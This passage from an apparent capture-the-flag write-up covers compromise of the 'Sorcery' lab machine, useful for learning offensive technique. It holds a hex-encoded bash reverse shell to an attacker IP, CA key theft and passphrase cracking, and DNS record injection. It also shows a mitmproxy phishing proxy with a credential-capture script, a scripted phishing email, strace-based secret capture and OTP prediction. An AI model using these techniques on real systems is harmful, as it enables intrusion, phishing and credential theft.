0000006e000000000000000100043078646600010000138800000001000675706461746500000001000000000000004200000000000000000000003666e0b9080000ffffffff0000002862617368202d69203e26202f6465762f7463702f31302e31302e31342e36312f34343320303e2631
```

#### Reverse Shell

I’ll paste that into the Debug tool:

![image-20260417214343088](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417214343088.webp)

On sending, I’ll get a shell:

```
oxdf@hacky$ sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.25.147 54338
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/app$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
user@7bfb70ee5b9c:/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash: /root/.bashrc: Permission denied

oxdf@hacky$ stty raw -echo; fg
sudo nc -lnvp 443
                 ‍reset

user@7bfb70ee5b9c:/app$
```

## Shell as tom\_summers

### Enumeration

This is clearly a Docker container as shown in the source, and it’s very stripped down. The user user’s home directory is completely empty:

```
user@7bfb70ee5b9c:/home/user$ ls -la
total 8
drwxr-xr-x 2 user user 4096 Oct 31  2024 .
drwxr-xr-x 1 root root 4096 Oct 31  2024 ..
```

There are very few binaries. No `nc`, `curl`, `wget`. There is `python3`:

```
user@7bfb70ee5b9c:/home/user$ which nc
user@7bfb70ee5b9c:/home/user$ which wget
user@7bfb70ee5b9c:/home/user$ which curl
user@7bfb70ee5b9c:/home/user$ which python3
/usr/bin/python3
```

The main app is in `/app` which contains a single file, `dns`. `file` isn’t installed, but the first four bytes match the ELF [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) 7f454c46:

```
user@7bfb70ee5b9c:/app$ python3 -c 'print(open("/app/dns", "rb").read(16).hex())'
7f454c46020101000000000000000000
```

This is probably just the compiled rust binary from [the source](#dns) (which I’ve already exploited by sending it a reverse shell).

There is a `/dns` directory with three files:

```
user@7bfb70ee5b9c:/dns$ ls
convert.sh  entries  hosts
```

I am able to get IPs for containers on the network with `dig`:

```
user@7bfb70ee5b9c:/$ dig ftp +short
172.19.0.11
```

### Strategy

I could upload a static `nmap` and start scanning the network, but because I have so much information from the source, I see a path to the next user already. If that doesn’t work, I can come back for more enumeration.

I know three important pieces of information from the [blog posts](#blog-1):

- tom\_summers hasn’t passed their phishing tests
- Phishing tests use Gitea as a lure.
- Users of the organization are taught to click on links if they are from an internal domain, using HTTPS, and have a certificate signed with the internal CA that is stored on FTP.

I’ll use Kafka to create a DNS record, and grab the CA certificate and private key from FTP. Then I can phish tom\_summers with a fake Gitea login page and capture their creds.

### Recover CA Keypair

#### FTP

I’ll use Python’s built in FTP library to read files from the FTP server. This one liner will login and print a listing of what’s there:

```
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.dir()'                  
drwxrwxrwx    2 ftp      ftp          4096 Oct 31  2024 pub
```

A single directory named `pub` (which matches the `Dockerfile` [above](#vsftpd)).

`pub` has the certificate and private key:

```
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); ftp.dir()'
-rw-r--r--    1 ftp      ftp          1826 Oct 31  2024 RootCA.crt
-rw-r--r--    1 ftp      ftp          3434 Oct 31  2024 RootCA.key
```

I’ll use `ftp.retrlines` to read the files:

```
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); print(ftp.retrlines("RETR RootCA.crt"))'
-----BEGIN CERTIFICATE-----

226 Transfer complete.
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); print(ftp.retrlines("RETR RootCA.key"))'
-----BEGIN ENCRYPTED PRIVATE KEY-----

...[snip]...
in0CLCi4ycZeT+dxcf82nMdhSzrwDckjuPRoppXZffgf
-----END ENCRYPTED PRIVATE KEY-----
226 Transfer complete.
```

I’ll save both copies on my host. I can also write copies to the DNS container with Python:

```
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); ftp.retrbinary("RETR RootCA.crt", open("/tmp/RootCA.crt", "wb").write)'
user@7bfb70ee5b9c:/$ python3 -c 'import ftplib; ftp=ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub"); ftp.retrbinary("RETR RootCA.key", open("/tmp/RootCA.key", "wb").write)'
user@7bfb70ee5b9c:/$ ls -l /tmp/RootCA.*
-rw-r--r-- 1 user user 1826 Apr 18 11:11 /tmp/RootCA.crt
-rw-r--r-- 1 user user 3434 Apr 18 11:11 /tmp/RootCA.key
```

#### Crack Passphrase

I’ll note the header on the private key is `-----BEGIN ENCRYPTED PRIVATE KEY-----`. To use this key, I’ll need the passphrase. I’ll use `pem2john.py` to create a hash from it, except the format for `john` includes a couple extra fields. Hashcat’s mode 24420 (PKCS#8 private keys) hardcodes the algorithm triple and expects only the salt, iteration count, and ciphertext blob. `pem2john.py` emits those same fields but prefixes them with the literal `$pbkdf2$sha256$aes256_cbc` that hashcat doesn’t want, so I’ll use `cut` to drop fields 4-6 to match [the expected hashcat format](https://hashcat.net/wiki/doku.php?id=example_hashes):

...[snip]...
```

The password is “password”. I’ll create a decrypted copy of the key:

```
oxdf@hacky$ openssl rsa -in RootCA.key -out RootCA-dec.key
Enter pass phrase for RootCA.key:
writing RSA key
```

### Set DNS Record

I’ll want to create a DNS record for a subdomain of `sorcery.htb` that will point to my host. I determined [above](#dns) that `dnsmasq` would load entries from `/dns/hosts` and `/dns/hosts-user` on startup, and that the service runs as user.

The `hosts` file is owned by root, but the `hosts-user` file doesn’t exist:

```
user@7bfb70ee5b9c:/dns$ ls -la            
total 24
drwxr-xr-x 1 user user 4096 Apr 18 11:34 .
drwxr-xr-x 1 root root 4096 Apr 28  2025 ..
-rwxr-xr-x 1 root root  364 Aug 31  2024 convert.sh
-rwxr--r-- 1 user user  650 Apr 17 21:40 entries
-rw-r--r-- 1 root root  650 Apr 17 17:39 hosts
```

Because the directory is owned by user, I can either move the `hosts` file or just create the `hosts-user` file:

```
user@7bfb70ee5b9c:/dns$ echo "10.10.14.61  0xdf.sorcery.htb" > hosts-user
```

Now I’ll kill and restart `dnsmasq`:

```
user@7bfb70ee5b9c:/dns$ pkill dnsmasq                         
user@7bfb70ee5b9c:/dns$ /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts &
[1] 288
user@7bfb70ee5b9c:/dns$ dnsmasq: started, version 2.89 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 127.0.0.11#53
dnsmasq: read /etc/hosts - 9 names
dnsmasq: read /dns/hosts - 25 names
dnsmasq: read /dns/hosts-user - 1 names
```

It worked:

```
user@7bfb70ee5b9c:/dns$ dig @localhost 0xdf.sorcery.htb +short
10.10.14.61
```

### Phish

#### Create Infrastructure

I’ll create a new key and a TLS certificate for `0xdf.sorcery.htb`, sign it with the Root CA, and bundle it into a PEM for the proxy:

```
oxdf@hacky$ openssl genrsa -out server.key 2048
oxdf@hacky$ openssl x509 -req -in <(openssl req -new -key server.key -subj '/CN=0xdf.sorcery.htb') -CA RootCA.crt -CAkey RootCA-dec.key -CAcreateserial -out server.crt -days 365
Certificate request self-signature ok
subject=CN = 0xdf.sorcery.htb
oxdf@hacky$ cat server.crt server.key > server.pem
```

I’ll use `mitmdump` from the Python tool [mitmproxy](https://www.mitmproxy.org/) (`uv tool install mitmproxy`). The following options will set it up to receive requests at `0xdf.sorcery.htb` and forward them to `git.sorcery.htb`:

- `--mode reverse:https://git.sorcery.htb/` - Run as a reverse proxy, forwarding all incoming requests to `git.sorcery.htb` over HTTPS.
- `-p 443` - Listening on port 443.
- `--ssl-insecure` - My computer doesn’t have the Sorcery root CA in its certificate store, so without this, requests from `mitmdump` to `git.sorcery.htb` will fail.
- `--certs '*=server.pem'` - Present the `server.pem` certificate for all incoming TLS connections regardless of SNI.

I’ll set `0xdf.sorcery.htb` to 127.0.0.1 in my `hosts` file, and run this:

```
oxdf@hacky$ mitmdump --mode reverse:https://git.sorcery.htb/ -p 443 --ssl-insecure --certs '*=server.pem'
[23:32:37.942] reverse proxy to https://git.sorcery.htb/ listening at *:443.
```

If I open my browser and visit `https://0xdf.sorcery.htb`, Gitea loads! At the terminal:

```

```

This is doing the proxy well, but it isn’t dumping the information I want. I’ll add `-q`, which eliminates the default logging. I’ll write a small add-on script:

```python
from mitmproxy import http
from urllib.parse import parse_qs

SKIP_EXT = ('.css', '.js', '.png', '.svg')

def request(flow: http.HTTPFlow):
    path = flow.request.path.split('?')[0]
    if path.endswith(SKIP_EXT):
        return
    print(f">> {flow.request.method} {flow.request.pretty_url}")
    if flow.request.method == "POST":
        for k, v in parse_qs(flow.request.get_text()).items():
            print(f"   {k}: {v[0]}")

def response(flow: http.HTTPFlow):
    path = flow.request.path.split('?')[0]
    if path.endswith(SKIP_EXT):
        return
    print(f"<< {flow.response.status_code} {flow.request.pretty_url}")
```

This is adding additional functionality to both the incoming requests and the outgoing responses. For requests, it will check the extension, and if it isn’t in an ignore list, it’ll print a message. If it’s a post request, it will also include the key / values from the body. For the response it shows the code and the url.

I’ll add this script with `-s`. When I try to visit the site and login, the creds are dumped to the screen:

```
oxdf@hacky$ mitmdump --mode reverse:https://git.sorcery.htb/ -p 443 --ssl-insecure --certs '*=server.pem' -q -s phish_addon.py 
>> GET https://git.sorcery.htb/
<< 200 https://git.sorcery.htb/
>> GET https://git.sorcery.htb/user/login?redirect_to=%2f
<< 200 https://git.sorcery.htb/user/login?redirect_to=%2f
>> POST https://git.sorcery.htb/user/login
   _csrf: 1aXwcpFRiV4uwADSm5xs4bRhqyM6MTc3NjUyOTkyNzkzNTIzMTk0Mw
   user_name: 0xdf
   password: bad_password
<< 200 https://git.sorcery.htb/user/login
```

I can also check out the certificate for the site. While my browser doesn’t trust it (it doesn’t trust the Sorcery CA), it does show that it’s signed by the Sorcery CA:

#### Send Email

I’ll send tom\_summers a link to my site:

```

Then I can look for a hit at my proxy. If I don’t get anything, I can check MailHog:

```

```

My message is gone (the bot deletes emails after processing), but there’s a reply from tom with a body of:

> `https://0xdf.sorcery.htb/` is not signed by our CA.

The bot followed the link, connected to my proxy, checked the TLS certificate, and rejected it.

I could use [Chisel](https://github.com/jpillora/chisel) to set up a tunnel and actually see the MailHog site, and it would look like this:

![image-20260418173818106](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260418173818106.webp)

I am fine doing it via Python. To clear the logs, I can send this:

```
user@7bfb70ee5b9c:/$ python3 -c 'import urllib.request; urllib.request.urlopen(urllib.request.Request("http://mail:8025/api/v1/messages", method="DELETE")); print("Cleared")'
Cleared
```

On to fixing the certificate, the first issue I ran into was that my VM’s clock had drifted about seven hours ahead. The certificate’s `notBefore` date was in the future from the HTB machine’s perspective, so the bot rejected it as not yet valid. I synced the clock with `sudo ntpdate pool.ntp.org` and regenerated the certificate.

On rephishing tom now, there will be a visit to the page:

```
oxdf@hacky$ mitmdump --mode reverse:https://git.sorcery.htb/ -p 443 --ssl-insecure --certs '*=server.pem' -q -s phish_addon.py  
>> GET https://git.sorcery.htb/
<< 200 https://git.sorcery.htb/
```

But then nothing happens. In MailHog, there’s another reply:

> Okay, I will sign in on `https://0xdf.sorcery.htb/`. Thanks!

But there’s no other activity. And there’s no login form on that page. I’ll phish one more time, this time passing the Gitea login page URL:

```
user@7bfb70ee5b9c:/$ python3 - << 'PYEOF'
> import smtplib
> from email.mime.text import MIMEText
> msg = MIMEText('<a href="https://0xdf.sorcery.htb/user/login">Click here to verify your account</a>', 'html')
> msg["Subject"] = "Verify your Gitea account"
> msg["From"] = "admin@sorcery.htb"
> msg["To"] = "tom_summers@sorcery.htb"
> s = smtplib.SMTP("mail", 1025)
> s.send_message(msg)
> s.quit()
> print("Sent!")
> PYEOF
Sent!
```

Shortly after, there’s a GET:

```
>> GET https://git.sorcery.htb/user/login
<< 200 https://git.sorcery.htb/user/login
```

Then there’s a pause, where tom\_summers sends a reply:

> Okay, I will sign in on `https://0xdf.sorcery.htb/user/login`. Thanks!

And less than 10 seconds later, a POST:

```
>> POST https://git.sorcery.htb/user/login
   _csrf: OfHkh4InJ-RonHNAaEkMiMVaCYk6MTc3NjU0NTM5NzIxMTIzMTI2Mw
   user_name: tom_summers
   password: jNsMKQ6k2.XDMPu.
<< 200 https://git.sorcery.htb/user/login
```

The login returns 200 (not a redirect to the dashboard), meaning the credentials were rejected by Gitea. This is consistent with the blog post that said the infosec team “revoked the access and changed the password” after tom\_summers fell for the phishing test.

### SSH

These credentials work over SSH:

```
oxdf@hacky$ sshpass -p jNsMKQ6k2.XDMPu. ssh tom_summers@sorcery.htb
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...[snip]...
tom_summers@main:~$
```

And I can get `user.txt`:

```
tom_summers@main:~$ cat user.txt
5c4d7491************************
```

## Shell as tom\_summers\_admin

### Enumeration

#### Users

Other than `user.txt`, tom\_summers’ home directory is very empty:

```
tom_summers@main:~$ ls -la
total 16
drwxr-x--- 3 tom_summers tom_summers 4096 Apr 28  2025 .
drwxr-xr-x 7 root        root        4096 Oct 31  2024 ..
lrwxrwxrwx 1 root        root           9 Oct 30  2024 .bash_history -> /dev/null
drwx------ 2 tom_summers tom_summers 4096 Mar 19  2025 .cache
-rw-r----- 1 root        tom_summers   33 Apr 18 16:04 user.txt
```

There are five users with home directories in `/home`:

```
tom_summers@main:/home$ ls
rebecca_smith  tom_summers  tom_summers_admin  user  vagrant
```

Those are the same users with shells set in `passwd`:

```
tom_summers@main:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
vagrant:x:1001:1001::/home/vagrant:/usr/bin/bash
tom_summers:x:2001:2001::/home/tom_summers:/usr/bin/bash
tom_summers_admin:x:2002:2002::/home/tom_summers_admin:/usr/bin/bash
rebecca_smith:x:2003:2003::/home/rebecca_smith:/usr/bin/bash
```

tom\_summers does not have any `sudo` privileges:

```
tom_summers@main:/$ sudo -l
[sudo] password for tom_summers: 
Sorry, user tom_summers may not run sudo on localhost.
```

#### Host

The host has the main IP on `eth0`:

```
tom_summers@main:~$ ip addr show eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:e9:37 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    altname ens192
    inet 10.129.25.147/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3158sec preferred_lft 3158sec
```

It seems this shell is not in a container. `containerd` is installed in `/opt`, along with a `scripts` directory only accessible to the admin user or admins group:

```
tom_summers@main:/$ ls -l opt/
total 8
drwx--x--x 4 root  root   4096 Oct 31  2024 containerd
drwx------ 2 admin admins 4096 Apr 25  2025 scripts
```

There is an `xorg` directory at the root of the filesystem. I’ll come back to that.

#### Processes

There are a few interesting lines in the process list (`ps auxww`).

[SSSD](https://sssd.io/) (System Security Services Daemon) is running, which is an open source client for centralized identity and authentication. It provides access to LDAP, Active Directory, and Kerberos providers, allowing Linux machines to authenticate users against a domain controller:

```

There’s some kind of identity / domain service in use with the domain `sorcery.htb`. I’ll come back to this later.

There are also nine `docker-proxy` processes forwarding traffic to specific ports:

```
root        2585  0.0  0.0 1745440 4608 ?        Sl   10:50   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.21.0.2 -container-port 5000 -use-listen-fd

tom_sum+  724549  0.0  0.0   4088  1920 pts/0    S+   18:03   0:00 grep docker-proxy
```

This is interesting because there are three hosts in different Docker networks:

| IP | Host | Ports | Comment |
| --- | --- | --- | --- |
| 172.21.0.2 | 127.0.0.1 | TCP 5000 | Unknown |
| 172.23.0.2 | 127.0.0.1 | TCP 88, 389, 464, 636   UDP 88, 464 | Kerberos and LDAP - Likely IDP related |
| 172.19.0.9 | 0.0.0.0   :: | TCP 443 | Website in network already explored |

There’s also a process running `registry`:

```
165536      2285  0.0  0.2 729064 17800 ?        Ssl  10:50   0:03 registry serve /etc/docker/registry/config.yml
```

That path doesn’t exist on the main host, and the default port for Docker Registry is 5000, suggesting the host on 172.21.0.2 is running [Docker Registry](https://docs.docker.com/reference/api/registry/latest/). `curl` to `/` returns nothing, but `/v2/` returns an unauthorized message:

```
tom_summers_admin@main:~$ curl localhost:5000
tom_summers_admin@main:~$ curl localhost:5000/v2/
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
```

That’s Docker Registry. I’ll come back to this.

tom\_summers\_admin seems to be running a shell script about a text editor:

```
tom_sum+    1443  0.0  0.0   2800  1536 ?        Ss   16:04   0:00 /bin/sh -c /provision/cron/tom_summers_admin/text-editor.sh          
tom_sum+    1453  0.0  0.0   4752  3072 ?        S    16:04   0:00 /bin/bash /provision/cron/tom_summers_admin/text-editor.sh   
tom_sum+    1475  0.0  1.1 626640 91216 ?        Sl   16:04   0:00 /usr/bin/mousepad /provision/cron/tom_summers_admin/passwords.txt
```

Seeing the mention of `passwords.txt` is also interesting. [Mousepad](https://github.com/codebrainz/mousepad) is a lightweight GTK text editor for the Xfce desktop environment, basically the Linux equivalent of Notepad. So tom\_summers\_admin is running a GUI text editor with a file called `passwords.txt` open.

There’s also `Xvfb` running as tom\_summers\_admin:

```
tom_sum+    1477  0.0  0.7 227012 60528 ?        S    16:04   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
```

[Xvfb](https://www.x.org/releases/X11R7.6/doc/man/man1/Xvfb.1.xhtml) (X Virtual FrameBuffer) is a display server that implements the X11 protocol entirely in memory, without any physical display. It lets graphical applications run headlessly. The `-fbdir /xorg/xvfb` flag tells it to write the raw framebuffer data to files in that directory, and `-screen 0 512x256x24` creates a 512x256 pixel screen with 24-bit color.

### Recover Password

The Xvfb framebuffer files can be read to see what’s currently on the virtual screen, which in this case hopefully will show `mousepad` with `passwords.txt`. The raw framebuffer is in `/xorg/xvfb`:

```
tom_summers@main:/xorg/xvfb$ ls -l
total 516
-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Apr 18 16:04 Xvfb_screen0
```

It’s owned by tom\_summers\_admin, but world readable. I’ll copy it to my host:

```
oxdf@hacky$ sshpass -p jNsMKQ6k2.XDMPu. scp tom_summers@sorcery.htb:/xorg/xvfb/Xvfb_screen0 .
oxdf@hacky$ file Xvfb_screen0 
Xvfb_screen0: X-Window screen dump image data, version X11, "Xvfb main.sorcery.htb:1.0", 512x256x24, 256 colors 256 entries
```

There are a few easy ways to view this file. `xwud` (`sudo apt install x11-apps`) will view it directly with `xwud -in Xvfb_screen0`:

![image-20260418175410720](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260418175410720.webp)

`convert` from [ImageMagick](https://imagemagick.org/) can also make a PNG from it:

```
oxdf@hacky$ convert xwd:Xvfb_screen0 Xvfb_screen0.png
```

That works too:

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-sorcery-Xvfb_screen0.webp)

### su / SSH

The password works for tom\_summers\_admin with `su`:

```
tom_summers@main:~$ su - tom_summers_admin
Password: 
tom_summers_admin@main:~$
```

It also works over SSH:

```
oxdf@hacky$ sshpass -p dWpuk7cesBjT- ssh tom_summers_admin@sorcery.htb 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...[snip]...

```

## Shell as donna\_adams

### Enumeration

tom\_summers\_admin isn’t in any special groups:

```
tom_summers_admin@main:~$ id
uid=2002(tom_summers_admin) gid=2002(tom_summers_admin) groups=2002(tom_summers_admin)
```

Their home directory is pretty empty as well:

```

The `.docker` directory does suggest some Docker activity. The `config.json` file shows:

```
tom_summers_admin@main:~$ cat .docker/config.json 
{ "credsStore": "docker-auth" }
```

This tells the Docker CLI to use an external credential helper to store and retrieve registry credentials. Docker [resolves](https://docs.docker.com/reference/cli/docker/login/#credential-helpers) a `credsStore` value by prefixing it with `docker-credential-` and looking up the resulting program name in `$PATH`:

> The value of the config property should be the suffix of the program to use (i.e. everything after `docker-credential-`). \[…\] Docker requires the helper program to be in the client’s host `$PATH`.

So `"credsStore": "docker-auth"` causes the Docker CLI to invoke `docker-credential-docker-auth` whenever it needs to store or retrieve a credential. That binary is not part of a default Docker install, but custom made for this challenge:

```
tom_summers_admin@main:~$ which docker-credential-docker-auth
/usr/bin/docker-credential-docker-auth
tom_summers_admin@main:~$ ls -la /usr/bin/docker-credential-docker-auth
-rwxr-x--- 1 rebecca_smith tom_summers_admin 67189841 Apr  6  2025 /usr/bin/docker-credential-docker-auth

```

Owned by rebecca\_smith with group tom\_summers\_admin, allowing tom\_summers\_admin to read and execute it but not modify it. The ~67 MB size suggests that either this binary has a lot of complex functionality, or it contains a bundled runtime (typical of self-contained.NET or Go binaries).

tom\_summers\_admin can run two commands as rebecca\_smith with `sudo`:

```
tom_summers_admin@main:~$ sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

`strace` allows for one process to trace another, observing and intercepting system calls (syscalls).

`docker login` allows connecting to a Docker registry, using the credentials at `~/.docker/config.json`. Trying out `docker login` fails:

```
tom_summers_admin@main:~$ sudo -u rebecca_smith docker login

It is failing trying to connect to the Docker socket. The output does show that it’s trying to connect as rebecca\_smith, attempted to login, but didn’t succeed.

I’ll upload [pspy](https://github.com/DominicBreuker/pspy) and watch what happens when I run `sudo -u rebecca_smith docker login`:

```
2026/04/19 17:45:47 CMD: UID=2003  PID=694726 | sudo -u rebecca_smith docker login

2026/04/19 17:45:47 CMD: UID=2003  PID=694743 | docker-credential-docker-auth store
```

It’s calling `docker-credential-docker-auth` twice, once to `get`, and once to `store`.

#### Password + OTP Recovery via PSpy

There is a cron running every minute that calls `/provision/cron/root/otp.sh`. PSpy never catches all the parts at the same time, but it seems to:

- Call `/provision/cron/root/otp-generator`.
- Call `cat /provision/cron/root/rebecca_password.txt`.
- Call `htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg229732`

Judging by the names, it seems that each minute the OTP generator is called, combined with the static password for rebecca\_smith, and passed to `htpasswd`. `htpasswd` will hash the password into the required format using the following args:

- `-B` - Use bcrypt hashing for passwords.
- `-b` - Use batch mode; *i.e.*, get the password from the command line rather than prompting for it.
- `-c` - Create the output file if it doesn’t exist, overwrite it if it does.
- `../registry.password` - The output file.
- `rebecca_smith` - The username.
- `-7eAZDp9-f9mg229732` - The password.

I let PSpy capture for almost four hours, and it caught the `htpasswd` call 30 times:

```

Based on the times, it seems clear this runs every minute. Catching 30 out of 230 means it catches it ~13% of the time.

The password is changing, but it is not different every time:

```
13:15:01 -7eAZDp9-f9mg699914
13:20:01 -7eAZDp9-f9mg270098
13:32:01 -7eAZDp9-f9mg740280
14:04:01 -7eAZDp9-f9mg229732
14:20:01 -7eAZDp9-f9mg270098
14:31:01 -7eAZDp9-f9mg740280
14:34:01 -7eAZDp9-f9mg740280
14:53:01 -7eAZDp9-f9mg780645
14:56:01 -7eAZDp9-f9mg780645
15:10:01 -7eAZDp9-f9mg699914
15:21:01 -7eAZDp9-f9mg270098
15:27:01 -7eAZDp9-f9mg270098
15:31:01 -7eAZDp9-f9mg740280
15:38:01 -7eAZDp9-f9mg740280
15:50:01 -7eAZDp9-f9mg780645
15:51:01 -7eAZDp9-f9mg780645
15:58:01 -7eAZDp9-f9mg780645
16:00:01 -7eAZDp9-f9mg229732
16:10:02 -7eAZDp9-f9mg699914
16:12:01 -7eAZDp9-f9mg699914
16:20:01 -7eAZDp9-f9mg270098
16:30:01 -7eAZDp9-f9mg740280
16:35:01 -7eAZDp9-f9mg740280
16:37:01 -7eAZDp9-f9mg740280
16:40:01 -7eAZDp9-f9mg310463
16:44:02 -7eAZDp9-f9mg310463
16:47:01 -7eAZDp9-f9mg310463
16:51:01 -7eAZDp9-f9mg780645
17:01:02 -7eAZDp9-f9mg229732
17:05:01 -7eAZDp9-f9mg229732
```

That shows that the password is really a static password, plus a six digit OTP. Looking at the different captured passwords, there are only six unique OTPs:

```
4 -7eAZDp9-f9mg229732
5 -7eAZDp9-f9mg270098
3 -7eAZDp9-f9mg310463
4 -7eAZDp9-f9mg699914
8 -7eAZDp9-f9mg740280
6 -7eAZDp9-f9mg780645
```

Looking even more closely, the OTP only changes every 10 minutes. When two commands have the same tens digit in the minute, they have the same password. I can know the OTP just by looking at the current minute value:

| Minute | OTP |
| --- | --- |
| 0-9 | 229732 |
| 10-19 | 699914 |
| 20-29 | 270098 |
| 30-39 | 740280 |
| 40-49 | 310463 |
| 50-59 | 780645 |

Even if I didn’t want to capture processes for four hours, I could easily watch PSpy until I found this call, and then use it for the short term until it rolls at the next ten-minute rotation.

#### Password Recovery via strace

When dealing with `strace`, it’s useful to see how tracing is configured:

```
tom_summers_admin@main:~$ cat /proc/sys/kernel/yama/ptrace_scope 
0
```

According to [the docs](https://www.kernel.org/doc/Documentation/security/Yama.txt), 0 means:

> classic ptrace permissions: a process can PTRACE\_ATTACH to any other process running under the same uid, as long as it is dumpable (i.e. did not transition uids, start privileged, or have called prctl(PR\_SET\_DUMPABLE…) already). Similarly, PTRACE\_TRACEME is unchanged.

I can trace any process owned by the user running `strace`, which means rebecca\_smith (and any other user I’ve compromised).

`strace` won’t honor SetUID, so I can’t run `sudo -u rebecca_smith strace sudo -u rebecca_smith docker login`. Instead I have to wait for the `docker login` process and then attach to it. I’ll use two SSH sessions. A bit of testing shows that `docker login` isn’t the process I’m interested in, but rather `docker-credential-docker-auth`.

In the first, I’ll set a loop to watch for `docker-credential-docker-auth` processes:

```
tom_summers_admin@main:~$ until p=$(pgrep -u rebecca_smith -of 'docker-credential-docker-auth'); do sleep 0.01; done; sudo -u rebecca_smith strace -s 128 -p "$p"
```

This hangs, waiting for a `docker-credential-docker-auth` process. In another window, I’ll run `docker login` as rebecca\_smith using `sudo`. The original loop finds the process, exits the loop, and attaches:

```
tom_summers_admin@main:~$ until p=$(pgrep -u rebecca_smith -of 'docker-credential-docker-auth'); do sleep 0.01; done; sudo -u rebecca_smith strace -s 128 -p "$p"

It’s almost always best to read `strace` output from the bottom. Towards the very end are three `write` calls:

```
write(64, "This account might be protected by two-factor authentication\n", 61) = 61
write(64, "In case login fails, try logging in with <password><otp>\n", 57) = 57
write(33, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 54) = 54
```

It hints that 2FA may be involved, and gives the password, “-7eAZDp9-f9mg”.

It’s also worth noting that I can get a shell with this password:

```
oxdf@hacky$ sshpass -p '-7eAZDp9-f9mg' ssh rebecca_smith@sorcery.htb
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...[snip]...
rebecca_smith@main:~$
```

But it doesn’t gain anything at this point. Surprisingly, rebecca\_smith doesn’t have any way on this system to generate OTPs.

#### OTP Recovery via RE

I’ll grab a copy of the binary using `scp`:

```
oxdf@hacky$ sshpass -p dWpuk7cesBjT- scp tom_summers_admin@sorcery.htb:/usr/bin/docker-credential-docker-auth .
oxdf@hacky$ file docker-credential-docker-auth 
docker-credential-docker-auth: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=80b42387c3bddabffe562898e3136c7d5958ac38, stripped
```

The strings in the binary show it is.NET:

```
oxdf@hacky$ strings docker-credential-docker-auth | grep -F \.NET | tail

    "name": ".NETCoreApp,Version=v8.0/linux-x64",

      "runtimepack.Microsoft.NETCore.App.Runtime.linux-x64/8.0.14": {

    "runtimepack.Microsoft.NETCore.App.Runtime.linux-x64/8.0.14": {

```

I’ll open this in [DotPeek](https://www.jetbrains.com/decompiler/):

![image-20260419163459822](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260419163459822.webp)

There’s a ton of libraries loaded because this is compiled to bring along the entire.NET runtime. The custom code is in `<Top-Level Entry Point>`.

At the top it validates that exactly one arg is passed in, and that it’s one of “get”, “store”, and “otp”:

```cs
if (args.Length != 1)
{
  Console.Error.WriteLine("Invalid arguments.");
}
else
{
  (Action<object>, InputType) valueTuple;
  if (!new Dictionary<string, (Action<object>, InputType)>()
  {
    {
      "get",
      (new Action<object>(HandleGet), InputType.Plain)
    },
    {
      "store",
      (new Action<object>(HandleStore), InputType.Json)
    },
    {
      "otp",
      (new Action<object>(HandleOtp), InputType.None)
    }
  }.TryGetValue(args[0], out valueTuple))
  {
    Console.WriteLine("Not implemented.");
  }
  else
  {
```

I’m most interested in OTP, which calls the `HandleOtp` function:

```cs
static void HandleOtp(object dynamicArgs)
{
  new Random(DateTime.Now.Minute / 10 + (int) GetCurrentExecutableOwner().UserId).Next(100000, 999999);
  Console.WriteLine("OTP is currently experimental. Please ask our admins for one");
}
```

